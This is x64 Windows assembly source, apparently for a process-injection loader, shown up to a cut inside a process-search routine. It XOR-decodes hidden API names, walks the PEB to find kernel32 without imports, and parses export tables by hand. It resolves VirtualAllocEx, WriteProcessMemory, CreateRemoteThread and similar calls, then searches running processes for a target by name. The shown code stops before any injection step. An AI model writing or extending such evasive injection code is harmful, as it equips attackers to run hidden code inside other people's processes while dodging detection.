; arg0: src         rcx
; arg1: dst         rdx
; arg2: nBytes      r8
memcpy:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; src
    mov [rbp + 24], rdx             ; dst
    mov [rbp + 32], r8              ; nBytes

    ; rbp - 8 = return value
    ; rbp - 16 = rsi
    ; rbp - 24 = rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; src
    mov rdi, [rbp + 24]             ; dst
    mov rcx, [rbp + 32]             ; nBytes

    rep movsb                       ; move from rsi to rdi until rcx == 0

    mov rdi, [rbp - 24]             ; save rdi
    mov rsi, [rbp - 16]             ; save rsi
    mov rax, [rbp - 8]              ; return value

    add rsp, 32                     ; free local variable space

    leave
    ret


; arg0: str             rcx
;
; ret: num chars        rax
strlen:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                 ; str

    ; rbp - 8 = output strlen
    ; rbp - 16 = rsi
    sub rsp, 16                         ; allocate local variable space
    
    mov qword [rbp - 8], 0              ; strlen = 0
    mov [rbp - 16], rsi                 ; save rsi

    mov rsi, [rbp + 16]                 ; str

    jmp .while_condition
    .loop:
         inc qword [rbp - 8]            ; ++strlen

        .while_condition:
            lodsb                       ; load from mem to al

            cmp al, 0                   ; end of string ?
            jne .loop
    
    mov rsi, [rbp - 16]                 ; restore rsi 
    mov rax, [rbp - 8]                  ; strlen in rax
    add rsp, 16                         ; free local variable space

    leave
    ret

; arg0: wstr        rcx
;
; ret: num chars    rax
wstrlen:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                     ; wstr

    ; rbp - 8 = output strlen
    ; rbp - 16 = rsi
    sub rsp, 16                             ; allocate local variable space

    mov qword [rbp - 8], 0                  ; return value
    mov [rbp - 16], rsi                     ; save rsi

    mov rsi, [rbp + 16]                     ; wstr

    jmp .while_condition
    .loop:
         inc qword [rbp - 8]                ; ++strlen

        .while_condition:
            lodsw                           ; load from mem to ax

            cmp ax, 0                       ; end of string ?
            jne .loop
    
    mov rsi, [rbp - 16]                     ; restore rsi
    mov rax, [rbp - 8]                      ; strlen in rax
    
    add rsp, 16                             ; free local variable space

    leave
    ret

; arg0: src        rcx
; arg1: dst        rdx
strcpy:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; src
    mov [rbp + 24], rdx             ; dst

    ; rbp - 8 = return value
    ; rbp - 16 = save rsi
    ; rbp - 24 = save rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; src
    mov rdi, [rbp + 24]             ; dst

.loop:
    lodsb                           ; load from rsi to al

    cmp al, 0                       ; end of string ?
    je .loop_end                    ; yes

    stosb                           ; store al to rdi
    jmp .loop

.loop_end:
    
    mov rdi, [rbp - 24]             ; restore rdi
    mov rsi, [rbp - 16]             ; restore rsi
    mov rax, [rbp - 8]              ; return value

    add rsp, 32                     ; free local variable space
    
    leave
    ret

; arg0: src        rcx
; arg1: dst        rdx
wstrcpy:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; src
    mov [rbp + 24], rdx             ; dst

    ; rbp - 8 = return value
    ; rbp - 16 = save rsi
    ; rbp - 24 = save rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; src
    mov rdi, [rbp + 24]             ; dst

.loop:
    lodsw                           ; load from rsi to ax

    cmp ax, 0                       ; end of string ?
    je .loop_end                    ; yes

    stosw                           ; store ax to rdi
    jmp .loop

.loop_end:
    
    mov rdi, [rbp - 24]             ; restore rdi
    mov rsi, [rbp - 16]             ; restore rsi
    mov rax, [rbp - 8]              ; return value

    add rsp, 32                     ; free local variable space
    
    leave
    ret

; arg0: str             rcx
; arg1: wstr            rdx
; arg2: str len         r8

; ret: 1 if equal       rax
strcmpAW:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; str
    mov [rbp + 24], rdx             ; wstr
    mov [rbp + 32], r8              ; str len

    ; rbp - 8 = return value
    ; rbp - 16 = rsi
    ; rbp - 24 = rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; str
    mov rdi, [rbp + 24]             ; wstr
    mov rcx, [rbp + 32]             ; str len

    .loop:
        movzx eax, byte [rsi]
        movzx edx, byte [rdi]

        cmp al, dl

        jne .loop_end_not_equal

        inc qword rsi
        add rdi, 2
        dec qword rcx
        jnz .loop

    .loop_end_equal:
        mov rax, 1                  ; return value
        jmp .shutdown

    .loop_end_not_equal:
        xor rax, rax                ; return value
        jmp .shutdown

.shutdown:
        mov rdi, [rbp - 24]         ; restore rdi
        mov rsi, [rbp - 16]         ; restore rsi

        add rsp, 32                 ; free local variable space

        leave
        ret

; arg0: str             rcx
; arg1: wstr            rdx
; arg2: str len         r8

; ret: 1 if equal       rax
strcmpiAW:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; str
    mov [rbp + 24], rdx             ; wstr
    mov [rbp + 32], r8              ; str len

    ; rbp - 8 = return value
    ; rbp - 16 = rsi
    ; rbp - 24 = rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; str
    mov rdi, [rbp + 24]             ; wstr
    mov rcx, [rbp + 32]             ; str len

    .loop:
        movzx eax, byte [rsi]
        movzx edx, byte [rdi]

        cmp al, dl

        jg .al_more_than_dl
        jl .al_less_than_dl

        inc qword rsi
        add rdi, 2
        dec qword rcx
        jnz .loop

    .loop_end_equal:

        mov rdi, [rbp - 24]         ; restore rdi
        mov rsi, [rbp - 16]         ; restore rsi
        mov rax, 1                  ; return value

        add rsp, 32                 ; free local variable space

        leave
        ret

        .al_more_than_dl:
            add dl, 32
            cmp al, dl

            jne .loop_end_not_equal

            inc qword rsi
            add rdi, 2
            dec qword rcx
            jnz .loop
            
            jmp .loop_end_equal
        
        .al_less_than_dl:
            add al, 32
            cmp al, dl

            jne .loop_end_not_equal

            inc qword rsi
            add rdi, 2
            dec qword rcx
            jnz .loop

            jmp .loop_end_equal

    .loop_end_not_equal:

        mov rdi, [rbp - 24]         ; restore rdi
        mov rsi, [rbp - 16]         ; restore rsi
        xor rax, rax                ; return value

        add rsp, 32                 ; free local variable space

        leave
        ret


; arg0: str1                    rcx
; arg1: str2                    rdx
; arg2: str1 len                r8
;
; ret: 1 if equal               rax
strcmpAA:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; str1
    mov [rbp + 24], rdx             ; str2
    mov [rbp + 32], r8              ; str1 len

    ; rbp - 8 = return value
    ; rbp - 16 = rsi
    ; rbp - 24 = rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; str1
    mov rdi, [rbp + 24]             ; str2
    mov rcx, [rbp + 32]             ; str1 len

    repe cmpsb
    jrcxz .equal

    .not_equal:
        mov qword [rbp - 8], 0
        jmp .shutdown

    .equal:
        mov qword [rbp - 8], 1
        jmp .shutdown

.shutdown:
        mov rdi, [rbp - 24]         ; restore rdi
        mov rsi, [rbp - 16]         ; restore rsi

        mov rax, [rbp - 8]          ; return value

        add rsp, 32                 ; free local variable space
        leave
        ret

; arg0: str                     rcx
; arg1: wstr                    rdx
; arg2: str len                 r8

; ret: 1 if equal               rax
strcmpiAA:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; str
    mov [rbp + 24], rdx             ; wstr
    mov [rbp + 32], r8              ; str len

    ; rbp - 8 = return value
    ; rbp - 16 = rsi
    ; rbp - 24 = rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; str
    mov rdi, [rbp + 24]             ; wstr
    mov rcx, [rbp + 32]             ; str len

    .loop:
        movzx eax, byte [rsi]
        movzx edx, byte [rdi]

        cmp al, dl
        jg .al_more_than_dl
        jl .al_less_than_dl
        
        inc rsi
        inc rdi
        dec rcx
        jnz .loop

    .loop_end_equal:

        mov rdi, [rbp - 24]         ; restore rdi
        mov rsi, [rbp - 16]         ; restore rsi
        mov rax, 1                  ; return value

        add rsp, 32                 ; free local variable space
    
        leave
        ret

        .al_more_than_dl:
            add dl, 32
            cmp al, dl

            jne .loop_end_not_equal

            inc rsi
            inc rdi
            dec rcx
            jnz .loop

            jmp .loop_end_equal

        .al_less_than_dl:
            add al, 32
            cmp al, dl

            jne .loop_end_not_equal
         
            inc rsi
            inc rdi
            dec rcx
            jnz .loop
            jmp .loop_end_equal

    .loop_end_not_equal:
        mov rdi, [rbp - 24]         ; restore rdi
        mov rsi, [rbp - 16]         ; restore rsi
        xor rax, rax                ; return value

        add rsp, 32                 ; free local variable space
    
        leave
        ret


; arg0: str                     rcx
; arg1: chr                     rdx
;
; return: ptr to chr            rax
strchr:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; str 
    mov [rbp + 24], rdx             ; chr

    ; rbp - 8 = cRet
    ; rbp - 16 = strlen
    ; rbp - 24 = c
    ; rbp - 32 = rbx
    sub rsp, 32                     ; allocate local variable space
    sub rsp, 32                     ; allocate shadow space

    mov qword [rbp - 8], -1         ; cRet = 0
    mov [rbp - 32], rbx             ; save rbx

    mov rcx, [rbp + 16]             ; str
    call strlen                     ; strlen

    mov [rbp - 16], rax             ; strlen

    mov qword [rbp - 24], 0         ; c = 0
    .loop:
        mov rdx, [rbp + 16]         ; str in rdx     
        mov rbx, [rbp - 24]         ; c in rbx

        movzx ecx, byte [rdx + rbx] ; sStr[c]

        cmp cl, [rbp + 24]          ; sStr[c] == chr ?

        je .equal

        inc qword [rbp - 24]        ; ++c
        mov rax, [rbp - 16]         ; strlen in rax
        cmp [rbp - 24], rax         ; c < strlen ?

        jne .loop
        jmp .shutdown

        .equal:
            add rdx, rbx
            mov [rbp - 8], rdx     ; cRet = str + c

            jmp .shutdown

.shutdown:
    mov rbx, [rbp - 32]             ; restore rbx
    mov rax, [rbp - 8]              ; return value

    add rsp, 32                     ; free shadow space
    add rsp, 32                     ; free local variable space

    leave
    ret

; arg0: data            rcx
; arg1: data_len        rdx
; arg2: key             r8
; arg3: key_len         r9
my_xor:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                         ; data
    mov [rbp + 24], rdx                         ; data len
    mov [rbp + 32], r8                          ; key
    mov [rbp + 40], r9                          ; key len

    ; rbp - 8 = return value
    ; rbp - 16 = i
    ; rbp - 24 = j
    ; rbp - 32 = bInput
    ; rbp - 40 = b
    ; rbp - 48 = data_bit_i
    ; rbp - 56 = key_bit_j
    ; rbp - 64 = bit_xor
    ; rbp - 72 = rbx
    ; rbp - 80 = 8 bytes padding
    sub rsp, 80                                 ; allocate local variable space

    mov qword [rbp - 8], 0                      ; return value
    mov qword [rbp - 16], 0                     ; i = 0
    mov qword [rbp - 24], 0                     ; j = 0
    mov [rbp - 72], rbx                         ; save rbx

    .data_loop:
        mov rax, [rbp - 24]                     ; j in rax
        cmp rax, [rbp + 40]                     ; j == key_len ?

        jne .continue_data_loop
        xor rax, rax
        mov [rbp - 24], rax                     ; j = 0
        
    .continue_data_loop:
        mov qword [rbp - 32], 0                 ; bInput = 0
        mov qword [rbp - 40], 0                 ; b = 0

        .bit_loop:
        ; bit test data
            xor rdx, rdx

            mov rdx, [rbp + 16]                 ; ptr to data in rdx
            mov rbx, [rbp - 16]                 ; i in rbx

            movzx eax, byte [rdx + rbx]         ; data char in al
            movzx ebx, byte [rbp - 40]          ; b in bl

            bt rax, rbx

            jc .data_bit_is_set
            mov qword [rbp - 48], 0             ; data_bit_i = 0
            jmp .bit_loop_continue_data

            .data_bit_is_set:
                mov qword [rbp - 48], 1         ; data_bit_i = 1

        .bit_loop_continue_data:
            ; bit test key

            mov rdx, [rbp + 32]                 ; ptr to key in rdx
            mov rbx, [rbp - 24]                 ; j in rbx
            
            movzx eax, byte [rdx + rbx]         ; key char in al
            movzx ebx, byte [rbp - 40]          ; b in bl

            bt rax, rbx

            jc .key_bit_is_set
            mov qword [rbp - 56], 0             ; key_bit_i = 0
            jmp .bit_loop_continue_key

            .key_bit_is_set:
                mov qword [rbp - 56], 1         ; key_bit_i = 1

        .bit_loop_continue_key:

            movzx eax, byte [rbp - 48]          ; data_bit_i in al
            cmp al, [rbp - 56]                  ; data_bit_i == key_bit_i ?

            je .bits_equal
            ; bits are unequal
            mov qword rax, 1
            movzx ecx, byte [rbp - 40]          ; b in cl
            shl al, cl
            mov [rbp - 64], al                  ; bit_xor = (data_bit_i != key_bit_j) << b

            jmp .bits_continue
            .bits_equal:
            ; bits equal
            ; so (data_bit_i != key_bit_j) == 0
                mov qword [rbp - 64], 0         ; bit_xor = 0

        .bits_continue:
            movzx eax, byte [rbp - 32]          ; bInput in al
            or al, [rbp - 64]                   ; bInput |= bit_xor

            mov [rbp - 32], al                  ; al to bInput

            inc qword [rbp - 40]                ; ++b
            mov qword rax, [rbp - 40]           ; b in rax
            cmp qword rax, 8                    ; b == 8 ?
            jnz .bit_loop


        mov qword rdx, [rbp + 16]               ; ptr to data in rdx
        mov qword rbx, [rbp - 16]                ; i in rbx

        movzx eax, byte [rbp - 32]              ; bInput in al
        mov [rdx + rbx], al                     ; data[i] = bInput

        inc qword [rbp - 24]                    ; ++j

        inc qword [rbp - 16]                     ; ++i
        mov rax, [rbp - 16]                      ; i in rax
        cmp rax, [rbp + 24]                     ; i == data_len ?

        jne .data_loop

.shutdown:
    mov rbx, [rbp - 72]                         ; restore rbx
    mov rax, [rbp - 8]                          ; return value

    add rsp, 80                                 ; free local variable space

    leave
    ret


get_kernel_module_handle:
    push rbp
    mov rbp, rsp

    ; [rbp - 8] = First List Entry
    ; [rbp - 16] = Current List Entry
    ; [rbp - 24] = Table Entry
    ; [rbp - 32] = return addr
    sub rsp, 32                         ; allocate local variable space
    sub rsp, 32                         ; allocate shadow space

    mov rcx, kernel32_xor
    mov rdx, kernel32_xor.len
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor                         ; kernel32.dll clear text

    mov rax, gs:[0x60]                  ; peb
    add rax, 0x18                       ; *ldr
    mov rax, [rax]                      ; ldr
    add rax, 0x20                       ; InMemoryOrderModuleList

    mov [rbp - 8], rax                  ; *FirstModule
    mov rax, [rax]
    mov [rbp - 16], rax                 ; CurrentModule
    mov qword [rbp - 32], 0             ; return code

.loop:
    cmp rax, [rbp - 8]                  ; CurrentModule == FirstModule ?
    je .loop_end_equal
        sub rax, 16                     ; *TableEntry
        mov [rbp - 24], rax             ; *TableEntry

        add rax, 0x58                   ; *BaseDLLName
        add rax, 0x8                    ; BaseDLLName.Buffer

        mov rcx, kernel32_xor
        mov rdx, [rax]
        mov r8, kernel32_xor.len
        call strcmpiAW

        cmp rax, 1                      ; strings match
        je .module_found

        mov rax, [rbp - 16]             ; CurrentModule
        mov rax, [rax]                  ; CurrentModule = CurrentModule->Flink
        mov [rbp - 16], rax             ; CurrentModule

        jmp .loop

.module_found:
    mov rax, [rbp - 24]                 ; *TableEntry
    add rax, 0x30                       ; TableEntry->DllBase
    mov rax, [rax]
    mov [rbp - 32], rax

    jmp .shutdown

.loop_end_equal:

.shutdown:
    add rsp, 32                         ; free shadow space
    add rsp, 32                         ; free local variable space

    mov rax, [rbp - 32]                 ; return code

    leave
    ret

; arg0: base addr           rcx
; arg1: proc name           rdx
; arg2: proc name len       r8
;
; return: proc addr         rax
get_proc_address_by_name:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                     ; base addr
    mov [rbp + 24], rdx                     ; proc name
    mov [rbp + 32], r8                      ; proc name len

    ; rbp - 8 = return value
    ; rbp - 16 = nt headers
    ; rbp - 24 = export data directory
    ; rbp - 32 = export directory
    ; rbp - 40 = address of functions
    ; rbp - 48 = address of names
    ; rbp - 56 = address of name ordinals
    ; rbp - 312 = forwarded dll.function name - 256 bytes
    ; rbp - 320 = function name
    ; rbp - 328 = loaded forwarded library addr
    ; rbp - 336 = function name strlen
    ; rbp - 344 = rbx
    ; rbp - 352 = 8 bytes padding
    sub rsp, 352                            ; allocate local variable space
    sub rsp, 32                             ; allocate shadow space

    mov qword [rbp - 8], 0                  ; return value
    mov [rbp - 344], rbx                    ; save rbx

    mov rbx, [rbp + 16]                     ; base addr
    add rbx, 0x3c                           ; *e_lfa_new

    movzx ecx, word [rbx]                   ; e_lfanew

    mov rax, [rbp + 16]                     ; base addr
    add rax, rcx                            ; nt header

    mov [rbp - 16], rax                     ; nt header

    add rax, 24                             ; optional header
    add rax, 112                            ; export data directory

    mov [rbp - 24], rax                     ; export data directory

    mov rax, [rbp + 16]                     ; base addr
    mov rcx, [rbp - 24]                     ; export data directory
    mov ebx, [rcx]
    add rax, rbx                            ; export directory

    mov [rbp - 32], rax                     ; export directory

    add rax, 28                             ; address of functions rva
    mov eax, [rax]                          ; rva in rax
    add rax, [rbp + 16]                     ; base addr + address of function rva

    mov [rbp - 40], rax                     ; address of functions

    mov rax, [rbp - 32]                     ; export directory
    add rax, 32                             ; address of names rva
    mov eax, [rax]                          ; rva in rax
    add rax, [rbp + 16]                     ; base addr + address of names rva

    mov [rbp - 48], rax                     ; address of names

    mov rax, [rbp - 32]                     ; export directory
    add rax, 36                             ; address of name ordinals
    mov eax, [rax]                          ; rva in rax
    add rax, [rbp + 16]                     ; base addr + address of name ordinals

    mov [rbp - 56], rax                     ; address of name ordinals

    mov r10, [rbp - 32]                     ; export directory
    add r10, 24                             ; number of names
    mov r10d, [r10]                         ; number of names in r10

    xor r11, r11
.loop_func_names:
    ; to index into an array, we multiply the size of each element with the 
    ; current index and add it to the base addr of the array
    mov dword eax, 4                        ; size of dword
    mul r11                                 ; size * index
    mov rbx, [rbp - 48]                     ; address of names
    add rbx, rax                            ; address of names + n
    mov ebx, [rbx]                          ; address of names [n]

    add rbx, [rbp +  16]                    ; base addr + address of names [n]

    mov rcx, [rbp + 24]                     ; proc name
    mov rdx, rbx
    mov r8, [rbp + 32]                      ; proc name len
    call strcmpiAA

    cmp rax, 1                              ; are strings equal
    je .function_found

    inc r11
    cmp r11, r10
    jne .loop_func_names

    jmp .shutdown

.function_found:
    mov rax, 2
    mul r11                                 ; index * size of element of addrees of name ordinals(word)
    add rax, [rbp - 56]                     ; address of name ordinals + n
    movzx eax, word [rax]                   ; address of name ordinals [n]; index into address of functions

    mov rbx, 4                              ; size of element of address of functions(dword)
    mul rbx                                 ; index * size of element
    add rax, [rbp - 40]                     ; address of functions + index
    mov eax, dword [rax]                    ; address of functions [index]

    add rax, [rbp + 16]                     ; base addr + address of functions [index]

    mov [rbp - 8], rax                      ; return value

    ; check if the function is forwarded
    mov r8, [rbp + 16]                      ; base addr
    mov rax, [rbp - 24]                     ; export data directory
    mov eax, [rax]                          ; export data directory virtual address
    add r8, rax                             ; base addr + virtual addr

    mov r9, r8
    mov rax, [rbp - 24]                     ; export data directory
    add rax, 4                              ; export data directory size
    mov eax, [rax]                          ; export data directory size
    add r9, rax                             ; base addr + virtual addr + size

    cmp [rbp - 8], r8                       ; below the start of the export directory
    jl .shutdown                            ; not forwarded
                                            ; or
    cmp [rbp - 8], r9                       ; above the end of the export directory
    jg .shutdown                            ; not forwarded

    ; make a copy of the string of the forwarded dll
    mov rcx, rbp
    sub rcx, 312
    mov rdx, [rbp - 8]
    call strcpy

    ; find the position of the '.' which separates the dll name and function name
    mov rcx, rbp
    sub rcx, 312
    mov rdx, '.'
    call strchr                             ; ptr to chr in rax
    
    mov byte [rax], 0
    inc rax

    mov [rbp - 320], rax                    ; forwarded function name

    mov rcx, rbp
    sub rcx, 312
    call [load_library_a]                      ; library addr

    mov [rbp - 328], rax                    ; library addr

    sub rsp, 32
    mov rcx, [rbp - 320]
    call strlen                             ; strlen in rax
    add rsp, 32

    mov [rbp - 336], rax                    ; function name strlen

    mov rcx, [rbp - 328]
    mov rdx, [rbp - 320]
    mov r8, [rbp - 336]
    call get_proc_address_by_name           ; proc addr

    mov [rbp - 8], rax                      ; proc addr

.shutdown:
    mov rbx, [rbp - 344]                    ; restore rbx
    mov rax, [rbp - 8]                      ; return value

    add rsp, 32                             ; free shadow space
    add rsp, 352                            ; free local variable space

    leave
    ret


; arg0: base addr               rcx
; arg1: proc name               rdx
; arg2: proc name len           r8
;
; return: proc addr             rax
get_proc_address_by_get_proc_addr:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                     ; base addr
    mov [rbp + 24], rdx                     ; proc name
    mov [rbp + 32], r8                      ; proc name len

    ; rbp - 8 = return value
    ; rbp - 16 = 8 bytes padding
    sub rsp, 16                             ; allocate local variable space
    sub rsp, 32                             ; allocate shadow space

    mov rcx, [rbp + 16]                     ; base addr
    mov rdx, [rbp + 24]                     ; proc name
    call [get_proc_addr]                    ; proc addr

    mov [rbp - 8], rax                      ; return value

.shutdown:
    mov rax, [rbp - 8]                      ; return value

    add rsp, 32                             ; free shadow space
    add rsp, 16                             ; free local variable space

    leave
    ret

; arg0: base addr               rcx
; arg1: xor str                 rdx
; arg2: xor str len             r8
; arg3: is get proc addr        r9
;
; return: proc addr             rax
unxor_and_get_proc_addr:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                         ; base addr
    mov [rbp + 24], rdx                         ; xor str
    mov [rbp + 32], r8                          ; xor str len
    mov [rbp + 40], r9                          ; is get proc addr

    ; rbp - 8 = return value
    ; rbp - 16 = 8 bytes padding
    sub rsp, 16                                 ; allocate local variable space
    sub rsp, 32                                 ; allocate shadow space

    mov rcx, [rbp + 24]
    mov rdx, [rbp + 32]
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor

    cmp qword [rbp + 40], 1                     ; is get proc addr
    jne .not_get_proc_addr
        mov rcx, [rbp + 16]                     ; base addr
        mov rdx, [rbp + 24]                     ; xor str
        mov r8, [rbp + 32]                      ; xor str len
        call get_proc_address_by_name

        mov [rbp - 8], rax                      ; proc addr

        jmp .shutdown

.not_get_proc_addr:
    mov rcx, [rbp + 16]                         ; base addr
    mov rdx, [rbp + 24]                         ; xor str
    mov r8, [rbp + 32]                          ; xor str len
    call get_proc_address_by_get_proc_addr

    mov [rbp - 8], rax                          ; proc addr

.shutdown:
    mov rax, [rbp - 8]                          ; return value

    add rsp, 32                                 ; free shadow space
    add rsp, 16                                 ; free local variable space

    leave
    ret

; arg0: kernel base addr           rcx
populate_kernel_function_ptrs_by_name:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                         ; kernel base addr

    sub rsp, 32                                 ; allocate shadow space

    mov rcx, [rbp + 16]
    mov rdx, get_proc_addr_xor
    mov r8, get_proc_addr_xor.len
    mov r9, 1
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_proc_addr], rax                    ; GetProcAddress addr

    mov rcx, [rbp + 16]
    mov rdx, get_last_error_xor
    mov r8, get_last_error_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_last_error], rax                   ; GetLastError addr

    mov rcx, [rbp + 16]
    mov rdx, load_library_a_xor
    mov r8, load_library_a_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [load_library_a], rax                   ; LoadLibraryA addr

    mov rcx, [rbp + 16]
    mov rdx, get_module_handle_a_xor
    mov r8, get_module_handle_a_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_module_handle_a], rax              ; GetModuleHandleA addr

    mov rcx, [rbp + 16]
    mov rdx, get_current_process_xor
    mov r8, get_current_process_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_current_process], rax              ; GetCurrentProcess addr

    mov rcx, [rbp + 16]
    mov rdx, open_process_xor
    mov r8, open_process_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [open_process], rax                     ; OpenProcess addr

    mov rcx, [rbp + 16]
    mov rdx, create_file_a_xor
    mov r8, create_file_a_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [create_file_a], rax                      ; CreateFileA addr

    mov rcx, [rbp + 16]
    mov rdx, write_file_xor
    mov r8, write_file_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [write_file], rax                       ; WriteFile addr

    mov rcx, [rbp + 16]
    mov rdx, virtual_alloc_ex_xor
    mov r8, virtual_alloc_ex_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_alloc_ex], rax                 ; VirtualAllocEx addr

    mov rcx, [rbp + 16]
    mov rdx, virtual_free_ex_xor
    mov r8, virtual_free_ex_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_free_ex], rax                  ; VirtualFreeEx addr

    mov rcx, [rbp + 16]
    mov rdx, virtual_protect_xor
    mov r8, virtual_protect_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_protect], rax                  ; VirtualProtect addr


    mov rcx, [rbp + 16]
    mov rdx, virtual_protect_ex_xor
    mov r8, virtual_protect_ex_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_protect_ex], rax               ; VirtualProtectEx addr

    mov rcx, [rbp + 16]
    mov rdx, read_process_memory_xor
    mov r8, read_process_memory_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [read_process_memory], rax              ; ReadProcessMemory addr

    mov rcx, [rbp + 16]
    mov rdx, write_process_memory_xor
    mov r8, write_process_memory_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [write_process_memory], rax             ; WriteProcessMemory addr

    mov rcx, [rbp + 16]
    mov rdx, create_remote_thread_xor
    mov r8, create_remote_thread_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [create_remote_thread], rax             ; CreateRemoteThread addr
     
    mov rcx, [rbp + 16]
    mov rdx, wait_for_single_object_xor
    mov r8, wait_for_single_object_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [wait_for_single_object], rax           ; WaitForSingleObject addr
 
    mov rcx, [rbp + 16]
    mov rdx, close_handle_xor
    mov r8, close_handle_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [close_handle], rax                     ; CloseHandle addr

    mov rcx, [rbp + 16]
    mov rdx, create_toolhelp32_snapshot_xor
    mov r8, create_toolhelp32_snapshot_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [create_toolhelp32_snapshot], rax       ; CreateToolhelp32Snapshot addr

    mov rcx, [rbp + 16]
    mov rdx, process32_first_xor
    mov r8, process32_first_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [process32_first], rax                  ; Process32First addr

    mov rcx, [rbp + 16]
    mov rdx, process32_next_xor
    mov r8, process32_next_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [process32_next], rax                   ;  Process32Next addr

    mov rcx, [rbp + 16]
    mov rdx, sleep_xor
    mov r8, sleep_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [sleep], rax                            ; Sleep addr

    mov rcx, [rbp + 16]
    mov rdx, output_debug_string_a_xor
    mov r8, output_debug_string_a_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [output_debug_string_a], rax            ; OutputDebugStringA addr

.shutdown:
    add rsp, 32                                 ; free shadow space

    leave
    ret

; arg0: proc name       rcx
; arg1: proc name len   rdx
;
; return: proc id       rax
find_target_process_id:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                     ; proc name
    mov [rbp + 24], rdx                     ; proc name len

    ; [rbp - 8] = return value
    ; [rbp - 16] = snapshot handle
    ; [rbp - 304] = process entry struct
    sub rsp, 304                            ; allocate local variable space
    sub rsp, 32                             ; allocate shadow space

    mov qword [rbp - 8], 0                  ; return value

    mov rcx, TH32CS_SNAPPROCESS
    xor rdx, rdx
    call [create_toolhelp32_snapshot]       ; snapshot handle

    cmp rax, INVALID_HANDLE_VALUE
    je .shutdown

    mov [rbp - 16], rax                     ; snapshot handle
    mov dword [rbp - 304], 304              ; processentry32.dwsize

    mov rcx, [rbp - 16]                     ; snapshot handle
    mov rdx, rbp
    sub rdx, 304                            ; &processentry 
    call [process32_first]

    cmp rax, 0                              ; if !process32First
    je .shutdown

.loop:
    mov rcx, [rbp - 16]                     ; snapshot handle
    mov rdx, rbp
    sub rdx, 304                            ; &processentry 
    call [process32_next]

    cmp rax, 0
    je .loop_end
        mov rcx, [rbp + 16]
        mov rdx, rbp
        sub rdx, 304
        add rdx, 44
        mov r8, [rbp + 24]
        call strcmpiAA

        cmp rax, 1                          ; are strings equal
        je .process_found        

        jmp .loop

.process_found:
    mov rax, rbp
    sub rax, 304
    add rax, 8 

